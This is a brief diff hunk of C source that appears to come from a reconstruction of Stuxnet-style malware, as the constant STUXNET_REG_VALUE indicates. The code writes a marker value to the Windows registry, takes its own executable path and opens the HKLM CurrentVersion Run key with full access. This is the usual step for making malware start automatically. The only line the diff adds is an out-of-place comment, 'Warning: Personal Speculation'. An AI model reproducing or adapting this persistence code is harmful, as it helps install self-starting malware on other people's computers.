@@ -3196,6 +3196,7 @@ static BOOL Winsta_WriteRegistry(VOID) {
     RegSetValueExW(hKey, STUXNET_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
     RegCloseKey(hKey);
     GetModuleFileNameW(NULL, szPath, WINSTA_MAX_PATH);
+    // Warning: Personal Speculation
     if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
         return FALSE;
     }
